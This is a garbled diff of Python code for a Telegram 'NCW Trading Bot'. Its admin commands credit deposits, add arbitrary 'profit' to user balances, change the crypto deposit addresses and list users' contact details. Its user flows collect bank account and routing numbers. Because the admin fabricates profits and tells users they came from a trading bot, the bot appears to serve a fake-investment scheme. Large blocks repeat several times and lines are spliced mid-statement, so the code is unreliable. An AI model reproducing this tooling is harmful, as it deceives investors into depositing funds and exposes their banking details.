+    context.user_data['routing_number'] = update.message.text.strip()
+    
+    user_info = get_user_data(user_id)
+    amount = context.user_data['withdraw_amount']),
             ],
             DEPOSIT_PROOF: [
                 MessageHandler(filters.PHOTO, get_deposit_proof),
-                CallbackQueryHandler(cancel_operation, pattern='^cancel$'),
+                CallbackQueryHandler(cancel_operation, pattern='^cancel:.2f}\n"
+            users_list += f"📊 Profit: ${data['profit']:.2f}\n"
+            users_list += f"📉 Withdrawal: ${data['withdrawal']:.2f}\n"
+            users_list += f"📊 Status: {status}\n"
+            users_list += f"🤖 Active Bot: {bot}\n"
+            users_list += f"💳 Pending Deposit: {pending_dep}\n"
+            users_list += f"💸 Pending Withdrawal: {pending_with}\n"
+            users_list += "━━━━━━━━━━━━━━━━━━━━\n"
+        
+        if len(users_list) > 4000:
+            parts = [users_list[i:i+4000] for i in range(0, len(users_list), 4000)]
+            for part in parts:
+                await context.bot.send_message(
+                    chat_id=update.effective_chat.id,
+                    text=part,
+                    parse_mode='Markdown'
+                )
+        else:
+            await context.bot.send_message(
+                chat_id=update.effective_chat.id,
+                text=users_list,
+                parse_mode='Markdown'
+            )
+    
+    elif action == 'admin_update_profit':
+        if not user_data:
+            await context.bot.send_message(
+                chat_id=update.effective_chat.id,
+                text="📝 No users registered yet."
+            )
+            return ADMIN_STATE
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text="Please use the command: /updateprofit <user_id> <amount>\n\nExample: /updateprofit 123456789 250.75"
+        )
+    
+    elif action == 'admin_update_crypto':
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text="Please use the command: /updatecrypto <crypto_name> <address>\n\nExample: /updatecrypto Bitcoin 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"
+        )
+    
+    elif action == 'admin_help':
+        help_text = """🛠 **Admin Panel Guide** 🛠
+
+Welcome to the NCW Trading Bot Admin Panel. Below are the available actions and how to use them:
+
+👥 **List Users**
+- View all registered users with details (ID, name, email, balance, etc.).
+- Use the 'List Users' button or /listusers.
+
+✅ **User Approval**
+- New user registrations will send you a notification with an 'Approve User' button.
+- Click the button to approve users automatically.
+
+💳 **Deposit Approval**
+- Deposit requests will send you a notification with an 'Approve' button.
+- Click the button to confirm deposits automatically.
+
+💸 **Withdrawal Approval**
+- Withdrawal requests will send you a notification with an 'Approve' button.
+- Click the button to process withdrawals automatically.
+
+📈 **Update Profit**
+- Add profit to a user's account based on trading bot performance.
+- Command: /updateprofit <user_id> <amount>
+- Example: /updateprofit 123456789 250.75
+
+🪙 **Update Crypto Address**
+- Change the wallet address for a cryptocurrency.
+- Command: /updatecrypto <crypto_name> <address>
+- Example: /updatecrypto Bitcoin 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa
+
+ℹ️ **Help**
+- Review this guide anytime with /adminhelp or the 'Help' button.
+
+**Tips:**
+- Use /getid to find a user's ID.
+- Most approvals now work with buttons for easier management.
+- All commands are case-sensitive."""
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text=help_text,
+            parse_mode='Markdown'
+        )
+    
+    return ADMIN_STATE
+
+async def approve_deposit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to approve deposits"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 2:
+            await update.message.reply_text("Usage: /approve <user_id> <amount>")
+            return
+        
+        user_id_target = int(args[0])
+        amount = float(args[1])
+        
+        if user_id_target not in user_data:
+            await update.message.reply_text("❌ User not found.")
+            return
+        
+        user_info = user_data[user_id_target]
+        user_info['balance'] += amount
+        user_info['deposit'] += amount
+        user_info['pending_deposit'] = 0
+        
+        try:
+            await context.bot.send_message(
+                chat_id=user_id_target,
+                text=f"✅ Your deposit of ${amount:.2f} has been confirmed! Your new balance is ${user_info['balance']:.2f}."
+            )
+        except TelegramError as e:
+            logger.error(f"Failed to notify user {user_id_target}: {e}")
+        
+        await update.message.reply_text(f"✅ Approved ${amount:.2f} deposit for user {user_id_target}.")
+        
+    except (ValueError, IndexError):
+        await update.message.reply_text("❌ Invalid format. Usage: /approve <user_id> <amount>")
+
+async def approve_withdrawal(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to approve withdrawals"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 2:
+            await update.message.reply_text("Usage: /approvewithdrawal <user_id> <amount>")
+            return
+        
+        user_id_target = int(args[0])
+        amount = float(args[1])
+        
+        if user_id_target not in user_data:
+            await update.message.reply_text("❌ User not found.")
+            return
+        
+        user_info = user_data[user_id_target]
+        
+        if amount > user_info['balance']:
+            await update.message.reply_text("❌ Insufficient user balance.")
+            return
+        
+        user_info['balance'] -= amount
+        user_info['withdrawal'] += amount
+        user_info['pending_withdrawal'] = 0
+        
+        try:
+            await context.bot.send_message(
+                chat_id=user_id_target,
+                text=f"✅ Your withdrawal of ${amount:.2f} has been processed! Your new balance is ${user_info['balance']:.2f}."
+            )
+        except TelegramError as e:
+            logger.error(f"Failed to notify user {user_id_target}: {e}")
+        
+        await update.message.reply_text(f"✅ Approved ${amount:.2f} withdrawal for user {user_id_target}.")
+        
+    except (ValueError, IndexError):
+        await update.message.reply_text("❌ Invalid format. Usage: /approvewithdrawal <user_id> <amount>")
+
+async def update_profit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to update user profits"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 2:
+            await update.message.reply_text("Usage: /updateprofit <user_id> <amount>")
+            return
+        
+        user_id_target = int(args[0])
+        amount = float(args[1])
+        
+        if user_id_target not in user_data:
+            await update.message.reply_text("❌ User not found.")
+            return
+        
+        user_info = user_data[user_id_target]
+        user_info['profit'] += amount
+        user_info['balance'] += amount
+        
+        try:
+            await context.bot.send_message(
+                chat_id=user_id_target,
+                text=f"🎉 Congratulations! You've earned ${amount:.2f} in profits from your active trading bot. Your new balance is ${user_info['balance']:.2f}."
+            )
+        except TelegramError as e:
+            logger.error(f"Failed to notify user {user_id_target}: {e}")
+        
+        await update.message.reply_text(f"✅ Added ${amount:.2f} profit for user {user_id_target}.")
+        
+    except (ValueError, IndexError):
+        await update.message.reply_text("❌ Invalid format. Usage: /updateprofit <user_id> <amount>")
+
+async def update_crypto_address(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to update crypto addresses"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 2:
+            await update.message.reply_text("Usage: /updatecrypto <crypto_name> <address>")
+            return
+        
+        crypto_name = args[0].title()
+        address = args[1]
+        
+        if crypto_name not in crypto_addresses:
+            await update.message.reply_text(f"❌ Crypto {crypto_name} not found. Available: {', '.join(crypto_addresses.keys())}")
+            return
+        
+        crypto_addresses[crypto_name] = address
+        await update.message.reply_text(f"✅ Updated {crypto_name} address to: {address}")
+        
+    except IndexError:
+        await update.message.reply_text("❌ Invalid format. Usage: /updatecrypto <crypto_name> <address>")
+
+async def approve_user(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to approve user accounts"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 1:
+            await update.message.reply_text("Usage: /approveuser <user_id>")
+            return
+        
+        user_id_target = int(args[0])
+        
+        if user_id_target not in user_data:
+            await update.message.reply_text("❌ User not found.")
+            return
+        
+        user_info = user_data[user_id_target]
+        user_info['approved'] = True
+        
+        keyboard = [
+            [InlineKeyboardButton("✅ Proceed to Dashboard", callback_data='proceed_to_menu')]
+        ]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        
+        try:
+            await context.bot.send_message(
+                chat_id=user_id_target,
+                text=f"🎉 Great news {user_info['name']}! Your account has been approved. You can now access all trading features. Click 'Proceed to Dashboard' to continue.",
+                reply_markup=reply_markup
+            )
+        except TelegramError as e:
+            logger.error(f"Failed to notify user {user_id_target}: {e}")
+        
+        await update.message.reply_text(f"✅ Approved account for user {user_id_target} ({user_info['name']}).")
+        
+    except (ValueError, IndexError):
+        await update.message.reply_text("❌ Invalid format. Usage: /approveuser <user_id>")
+
+async def list_users(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to list all users"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    if not user_data:
+        await update.message.reply_text("📝 No users registered yet.")
+        return
+    
+    users_list = """👥 **Registered Users** 👥
+
+Below is a detailed list of all registered users:\n\n"""
+    for user_id_key, data in user_data.items():
+        status = "✅ Approved" if data['approved'] else "⏳ Pending"
+        bot = data['active_bot'] if data['active_bot'] else "None"
+        pending_dep = f"${data['pending_deposit']:.2f}" if data['pending_deposit'] > 0 else "None"
+        pending_with = f"${data['pending_withdrawal']:.2f}" if data['pending_withdrawal'] > 0 else "None"
+        
+        users_list += f"🆔 **{user_id_key}** - {data['name']}\n"
+        users_list += f"📧 {data['email']}\n"
+        users_list += f"📱 {data['phone']}\n"
+        users_list += f"💰 Balance: ${data['balance']:.2f}\n"
+        users_list += f"📈 Deposit: ${data['deposit']
+    address = context.user_data['crypto_address']
+    
+    admin_message = f"""💸 **Crypto Withdrawal Request**
+
+👤 **User:** {user_info['name']} (ID: {user_id})
+💰 **Amount:** ${amount:.2f}
+🏦 **Crypto Address:** {address}
+📱 **Phone:** {user_info['phone']}
+📧 **Email:** {user_info['email']}
+
+Click 'Approve' to process this withdrawal."""
+    
+    keyboard = [
+        [InlineKeyboardButton("✅ Approve", callback_data=f'approve_withdrawal_{user_id}_{amount}')]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    
+    try:
+        await context.bot.send_message(
+            chat_id=ADMIN_USER_ID,
+            text=admin_message,
+            reply_markup=reply_markup,
+            parse_mode='Markdown'
+        )
+    except TelegramError as e:
+        logger.error(f"Failed to send admin notification: {e}")
+        await update.message.reply_text(
+            "⚠️ Failed to process withdrawal request. Please try again or contact support.",
+            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
+        )
+        return MAIN_MENU
+    
+    user_info['pending_withdrawal'] = amount
+    
+    await update.message.reply_text(
+        "Your withdrawal request is pending admin confirmation.",
+        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
+    )
+    return MAIN_MENU
+
+async def get_bank_name(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Get bank name"""
+    user_id = update.effective_user.id
+    if user_id == ADMIN_USER_ID:
+        await update.message.reply_text("Admins cannot access user features.")
+        return ConversationHandler.END
+    context.user_data['bank_name'] = update.message.text.strip()
+    
+    await update.message.reply_text(
+        "Please enter your account number:",
+        reply_markup=create_cancel_keyboard()
+    )
+    return WITHDRAW_ACCOUNT
+
+async def get_account_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Get account number"""
+    user_id = update.effective_user.id
+    if user_id == ADMIN_USER_ID:
+        await update.message.reply_text("Admins cannot access user features.")
+        return ConversationHandler.END
+    context.user_data['account_number'] = update.message.text.strip()
+    
+    await update.message.reply_text(
+        "Please enter your routing number:",
+        reply_markup=create_cancel_keyboard()
+    )
+    return WITHDRAW_ROUTING
+
+async def get_routing_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Get routing number and process bank withdrawal"""
+    user_id = update.effective_user.id
+    if user_id == ADMIN_USER_ID:
+        await update.message.reply_text("Admins cannot access user features.")
+        return ConversationHandler.END
+    context.user_data['routing_number'] = update.message.text.strip()
+    
+    user_info = get_user_data(user_id)
+    amount = context.user_data['withdraw_amount']),
             ],
             WITHDRAW_AMOUNT: [
                 MessageHandler(filters.TEXT & ~filters.COMMAND, get_withdraw_amount),
-                CallbackQueryHandler(cancel_operation, pattern='^cancel$'),
+                CallbackQueryHandler(cancel_operation, pattern='^cancel:.2f}\n"
+            users_list += f"📊 Profit: ${data['profit']:.2f}\n"
+            users_list += f"📉 Withdrawal: ${data['withdrawal']:.2f}\n"
+            users_list += f"📊 Status: {status}\n"
+            users_list += f"🤖 Active Bot: {bot}\n"
+            users_list += f"💳 Pending Deposit: {pending_dep}\n"
+            users_list += f"💸 Pending Withdrawal: {pending_with}\n"
+            users_list += "━━━━━━━━━━━━━━━━━━━━\n"
+        
+        if len(users_list) > 4000:
+            parts = [users_list[i:i+4000] for i in range(0, len(users_list), 4000)]
+            for part in parts:
+                await context.bot.send_message(
+                    chat_id=update.effective_chat.id,
+                    text=part,
+                    parse_mode='Markdown'
+                )
+        else:
+            await context.bot.send_message(
+                chat_id=update.effective_chat.id,
+                text=users_list,
+                parse_mode='Markdown'
+            )
+    
+    elif action == 'admin_update_profit':
+        if not user_data:
+            await context.bot.send_message(
+                chat_id=update.effective_chat.id,
+                text="📝 No users registered yet."
+            )
+            return ADMIN_STATE
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text="Please use the command: /updateprofit <user_id> <amount>\n\nExample: /updateprofit 123456789 250.75"
+        )
+    
+    elif action == 'admin_update_crypto':
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text="Please use the command: /updatecrypto <crypto_name> <address>\n\nExample: /updatecrypto Bitcoin 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"
+        )
+    
+    elif action == 'admin_help':
+        help_text = """🛠 **Admin Panel Guide** 🛠
+
+Welcome to the NCW Trading Bot Admin Panel. Below are the available actions and how to use them:
+
+👥 **List Users**
+- View all registered users with details (ID, name, email, balance, etc.).
+- Use the 'List Users' button or /listusers.
+
+✅ **User Approval**
+- New user registrations will send you a notification with an 'Approve User' button.
+- Click the button to approve users automatically.
+
+💳 **Deposit Approval**
+- Deposit requests will send you a notification with an 'Approve' button.
+- Click the button to confirm deposits automatically.
+
+💸 **Withdrawal Approval**
+- Withdrawal requests will send you a notification with an 'Approve' button.
+- Click the button to process withdrawals automatically.
+
+📈 **Update Profit**
+- Add profit to a user's account based on trading bot performance.
+- Command: /updateprofit <user_id> <amount>
+- Example: /updateprofit 123456789 250.75
+
+🪙 **Update Crypto Address**
+- Change the wallet address for a cryptocurrency.
+- Command: /updatecrypto <crypto_name> <address>
+- Example: /updatecrypto Bitcoin 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa
+
+ℹ️ **Help**
+- Review this guide anytime with /adminhelp or the 'Help' button.
+
+**Tips:**
+- Use /getid to find a user's ID.
+- Most approvals now work with buttons for easier management.
+- All commands are case-sensitive."""
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text=help_text,
+            parse_mode='Markdown'
+        )
+    
+    return ADMIN_STATE
+
+async def approve_deposit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to approve deposits"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 2:
+            await update.message.reply_text("Usage: /approve <user_id> <amount>")
+            return
+        
+        user_id_target = int(args[0])
+        amount = float(args[1])
+        
+        if user_id_target not in user_data:
+            await update.message.reply_text("❌ User not found.")
+            return
+        
+        user_info = user_data[user_id_target]
+        user_info['balance'] += amount
+        user_info['deposit'] += amount
+        user_info['pending_deposit'] = 0
+        
+        try:
+            await context.bot.send_message(
+                chat_id=user_id_target,
+                text=f"✅ Your deposit of ${amount:.2f} has been confirmed! Your new balance is ${user_info['balance']:.2f}."
+            )
+        except TelegramError as e:
+            logger.error(f"Failed to notify user {user_id_target}: {e}")
+        
+        await update.message.reply_text(f"✅ Approved ${amount:.2f} deposit for user {user_id_target}.")
+        
+    except (ValueError, IndexError):
+        await update.message.reply_text("❌ Invalid format. Usage: /approve <user_id> <amount>")
+
+async def approve_withdrawal(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to approve withdrawals"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 2:
+            await update.message.reply_text("Usage: /approvewithdrawal <user_id> <amount>")
+            return
+        
+        user_id_target = int(args[0])
+        amount = float(args[1])
+        
+        if user_id_target not in user_data:
+            await update.message.reply_text("❌ User not found.")
+            return
+        
+        user_info = user_data[user_id_target]
+        
+        if amount > user_info['balance']:
+            await update.message.reply_text("❌ Insufficient user balance.")
+            return
+        
+        user_info['balance'] -= amount
+        user_info['withdrawal'] += amount
+        user_info['pending_withdrawal'] = 0
+        
+        try:
+            await context.bot.send_message(
+                chat_id=user_id_target,
+                text=f"✅ Your withdrawal of ${amount:.2f} has been processed! Your new balance is ${user_info['balance']:.2f}."
+            )
+        except TelegramError as e:
+            logger.error(f"Failed to notify user {user_id_target}: {e}")
+        
+        await update.message.reply_text(f"✅ Approved ${amount:.2f} withdrawal for user {user_id_target}.")
+        
+    except (ValueError, IndexError):
+        await update.message.reply_text("❌ Invalid format. Usage: /approvewithdrawal <user_id> <amount>")
+
+async def update_profit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to update user profits"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 2:
+            await update.message.reply_text("Usage: /updateprofit <user_id> <amount>")
+            return
+        
+        user_id_target = int(args[0])
+        amount = float(args[1])
+        
+        if user_id_target not in user_data:
+            await update.message.reply_text("❌ User not found.")
+            return
+        
+        user_info = user_data[user_id_target]
+        user_info['profit'] += amount
+        user_info['balance'] += amount
+        
+        try:
+            await context.bot.send_message(
+                chat_id=user_id_target,
+                text=f"🎉 Congratulations! You've earned ${amount:.2f} in profits from your active trading bot. Your new balance is ${user_info['balance']:.2f}."
+            )
+        except TelegramError as e:
+            logger.error(f"Failed to notify user {user_id_target}: {e}")
+        
+        await update.message.reply_text(f"✅ Added ${amount:.2f} profit for user {user_id_target}.")
+        
+    except (ValueError, IndexError):
+        await update.message.reply_text("❌ Invalid format. Usage: /updateprofit <user_id> <amount>")
+
+async def update_crypto_address(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to update crypto addresses"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 2:
+            await update.message.reply_text("Usage: /updatecrypto <crypto_name> <address>")
+            return
+        
+        crypto_name = args[0].title()
+        address = args[1]
+        
+        if crypto_name not in crypto_addresses:
+            await update.message.reply_text(f"❌ Crypto {crypto_name} not found. Available: {', '.join(crypto_addresses.keys())}")
+            return
+        
+        crypto_addresses[crypto_name] = address
+        await update.message.reply_text(f"✅ Updated {crypto_name} address to: {address}")
+        
+    except IndexError:
+        await update.message.reply_text("❌ Invalid format. Usage: /updatecrypto <crypto_name> <address>")
+
+async def approve_user(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to approve user accounts"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 1:
+            await update.message.reply_text("Usage: /approveuser <user_id>")
+            return
+        
+        user_id_target = int(args[0])
+        
+        if user_id_target not in user_data:
+            await update.message.reply_text("❌ User not found.")
+            return
+        
+        user_info = user_data[user_id_target]
+        user_info['approved'] = True
+        
+        keyboard = [
+            [InlineKeyboardButton("✅ Proceed to Dashboard", callback_data='proceed_to_menu')]
+        ]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        
+        try:
+            await context.bot.send_message(
+                chat_id=user_id_target,
+                text=f"🎉 Great news {user_info['name']}! Your account has been approved. You can now access all trading features. Click 'Proceed to Dashboard' to continue.",
+                reply_markup=reply_markup
+            )
+        except TelegramError as e:
+            logger.error(f"Failed to notify user {user_id_target}: {e}")
+        
+        await update.message.reply_text(f"✅ Approved account for user {user_id_target} ({user_info['name']}).")
+        
+    except (ValueError, IndexError):
+        await update.message.reply_text("❌ Invalid format. Usage: /approveuser <user_id>")
+
+async def list_users(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to list all users"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    if not user_data:
+        await update.message.reply_text("📝 No users registered yet.")
+        return
+    
+    users_list = """👥 **Registered Users** 👥
+
+Below is a detailed list of all registered users:\n\n"""
+    for user_id_key, data in user_data.items():
+        status = "✅ Approved" if data['approved'] else "⏳ Pending"
+        bot = data['active_bot'] if data['active_bot'] else "None"
+        pending_dep = f"${data['pending_deposit']:.2f}" if data['pending_deposit'] > 0 else "None"
+        pending_with = f"${data['pending_withdrawal']:.2f}" if data['pending_withdrawal'] > 0 else "None"
+        
+        users_list += f"🆔 **{user_id_key}** - {data['name']}\n"
+        users_list += f"📧 {data['email']}\n"
+        users_list += f"📱 {data['phone']}\n"
+        users_list += f"💰 Balance: ${data['balance']:.2f}\n"
+        users_list += f"📈 Deposit: ${data['deposit']
+    address = context.user_data['crypto_address']
+    
+    admin_message = f"""💸 **Crypto Withdrawal Request**
+
+👤 **User:** {user_info['name']} (ID: {user_id})
+💰 **Amount:** ${amount:.2f}
+🏦 **Crypto Address:** {address}
+📱 **Phone:** {user_info['phone']}
+📧 **Email:** {user_info['email']}
+
+Click 'Approve' to process this withdrawal."""
+    
+    keyboard = [
+        [InlineKeyboardButton("✅ Approve", callback_data=f'approve_withdrawal_{user_id}_{amount}')]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    
+    try:
+        await context.bot.send_message(
+            chat_id=ADMIN_USER_ID,
+            text=admin_message,
+            reply_markup=reply_markup,
+            parse_mode='Markdown'
+        )
+    except TelegramError as e:
+        logger.error(f"Failed to send admin notification: {e}")
+        await update.message.reply_text(
+            "⚠️ Failed to process withdrawal request. Please try again or contact support.",
+            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
+        )
+        return MAIN_MENU
+    
+    user_info['pending_withdrawal'] = amount
+    
+    await update.message.reply_text(
+        "Your withdrawal request is pending admin confirmation.",
+        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
+    )
+    return MAIN_MENU
+
+async def get_bank_name(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Get bank name"""
+    user_id = update.effective_user.id
+    if user_id == ADMIN_USER_ID:
+        await update.message.reply_text("Admins cannot access user features.")
+        return ConversationHandler.END
+    context.user_data['bank_name'] = update.message.text.strip()
+    
+    await update.message.reply_text(
+        "Please enter your account number:",
+        reply_markup=create_cancel_keyboard()
+    )
+    return WITHDRAW_ACCOUNT
+
+async def get_account_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Get account number"""
+    user_id = update.effective_user.id
+    if user_id == ADMIN_USER_ID:
+        await update.message.reply_text("Admins cannot access user features.")
+        return ConversationHandler.END
+    context.user_data['account_number'] = update.message.text.strip()
+    
+    await update.message.reply_text(
+        "Please enter your routing number:",
+        reply_markup=create_cancel_keyboard()
+    )
+    return WITHDRAW_ROUTING
+
+async def get_routing_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Get routing number and process bank withdrawal"""
+    user_id = update.effective_user.id
+    if user_id == ADMIN_USER_ID:
+        await update.message.reply_text("Admins cannot access user features.")
+        return ConversationHandler.END
+    context.user_data['routing_number'] = update.message.text.strip()
+    
+    user_info = get_user_data(user_id)
+    amount = context.user_data['withdraw_amount']),
             ],
             WITHDRAW_CRYPTO_ADDRESS: [
                 MessageHandler(filters.TEXT & ~filters.COMMAND, get_crypto_address),
-                CallbackQueryHandler(cancel_operation, pattern='^cancel$'),
+                CallbackQueryHandler(cancel_operation, pattern='^cancel:.2f}\n"
+            users_list += f"📊 Profit: ${data['profit']:.2f}\n"
+            users_list += f"📉 Withdrawal: ${data['withdrawal']:.2f}\n"
+            users_list += f"📊 Status: {status}\n"
+            users_list += f"🤖 Active Bot: {bot}\n"
+            users_list += f"💳 Pending Deposit: {pending_dep}\n"
+            users_list += f"💸 Pending Withdrawal: {pending_with}\n"
+            users_list += "━━━━━━━━━━━━━━━━━━━━\n"
+        
+        if len(users_list) > 4000:
+            parts = [users_list[i:i+4000] for i in range(0, len(users_list), 4000)]
+            for part in parts:
+                await context.bot.send_message(
+                    chat_id=update.effective_chat.id,
+                    text=part,
+                    parse_mode='Markdown'
+                )
+        else:
+            await context.bot.send_message(
+                chat_id=update.effective_chat.id,
+                text=users_list,
+                parse_mode='Markdown'
+            )
+    
+    elif action == 'admin_update_profit':
+        if not user_data:
+            await context.bot.send_message(
+                chat_id=update.effective_chat.id,
+                text="📝 No users registered yet."
+            )
+            return ADMIN_STATE
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text="Please use the command: /updateprofit <user_id> <amount>\n\nExample: /updateprofit 123456789 250.75"
+        )
+    
+    elif action == 'admin_update_crypto':
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text="Please use the command: /updatecrypto <crypto_name> <address>\n\nExample: /updatecrypto Bitcoin 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"
+        )
+    
+    elif action == 'admin_help':
+        help_text = """🛠 **Admin Panel Guide** 🛠
+
+Welcome to the NCW Trading Bot Admin Panel. Below are the available actions and how to use them:
+
+👥 **List Users**
+- View all registered users with details (ID, name, email, balance, etc.).
+- Use the 'List Users' button or /listusers.
+
+✅ **User Approval**
+- New user registrations will send you a notification with an 'Approve User' button.
+- Click the button to approve users automatically.
+
+💳 **Deposit Approval**
+- Deposit requests will send you a notification with an 'Approve' button.
+- Click the button to confirm deposits automatically.
+
+💸 **Withdrawal Approval**
+- Withdrawal requests will send you a notification with an 'Approve' button.
+- Click the button to process withdrawals automatically.
+
+📈 **Update Profit**
+- Add profit to a user's account based on trading bot performance.
+- Command: /updateprofit <user_id> <amount>
+- Example: /updateprofit 123456789 250.75
+
+🪙 **Update Crypto Address**
+- Change the wallet address for a cryptocurrency.
+- Command: /updatecrypto <crypto_name> <address>
+- Example: /updatecrypto Bitcoin 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa
+
+ℹ️ **Help**
+- Review this guide anytime with /adminhelp or the 'Help' button.
+
+**Tips:**
+- Use /getid to find a user's ID.
+- Most approvals now work with buttons for easier management.
+- All commands are case-sensitive."""
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text=help_text,
+            parse_mode='Markdown'
+        )
+    
+    return ADMIN_STATE
+
+async def approve_deposit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to approve deposits"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 2:
+            await update.message.reply_text("Usage: /approve <user_id> <amount>")
+            return
+        
+        user_id_target = int(args[0])
+        amount = float(args[1])
+        
+        if user_id_target not in user_data:
+            await update.message.reply_text("❌ User not found.")
+            return
+        
+        user_info = user_data[user_id_target]
+        user_info['balance'] += amount
+        user_info['deposit'] += amount
+        user_info['pending_deposit'] = 0
+        
+        try:
+            await context.bot.send_message(
+                chat_id=user_id_target,
+                text=f"✅ Your deposit of ${amount:.2f} has been confirmed! Your new balance is ${user_info['balance']:.2f}."
+            )
+        except TelegramError as e:
+            logger.error(f"Failed to notify user {user_id_target}: {e}")
+        
+        await update.message.reply_text(f"✅ Approved ${amount:.2f} deposit for user {user_id_target}.")
+        
+    except (ValueError, IndexError):
+        await update.message.reply_text("❌ Invalid format. Usage: /approve <user_id> <amount>")
+
+async def approve_withdrawal(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Admin command to approve withdrawals"""
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Unauthorized access.")
+        return
+    
+    try:
+        args = context.args
+        if len(args) != 2:
+            await update.message.reply_text("Usage: /approvewithdrawal <user_id> <amount>")
+            return
+        
+        user_id_target = int(args[0])
+        amount = float(args[1])
+        
+        if user_id_target not in user_data:
+            await update.message.reply_text("❌ User not found.")
+            return
+        
+        user_info = user_data[user_id_target]
+        
+        if amount > user_info['balance']:
+            await update.message.reply_text("❌ Insufficient user balance.")
+            return
+        
+        user_info['balance'] -= amount
+        user_info['withdrawal'] += amount
+        user_info['pending_withdrawal'] = 0
+        
+        try:
+            await context.bot.send_message(
+                chat_id=user_id_target,
+                text=f"✅ Your withdrawal of ${amount:.2f} has been processed! Your new balance is ${user_info['balance']:.2f}."
+            )
+        except TelegramError as e:
+            logger.error(f"Failed to notify user {user_id_target}: {e}")
+        
+        await update.message.reply_text(f"✅ Approved ${amount:.2f} withdrawal for user {user_id_target}.")
+        
+    except (ValueError, IndexError):
+        await update.message.reply_text("❌ Invalid format. Usage: /approvewithdrawal <user_id> <amount>")
+
+async def update_profit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
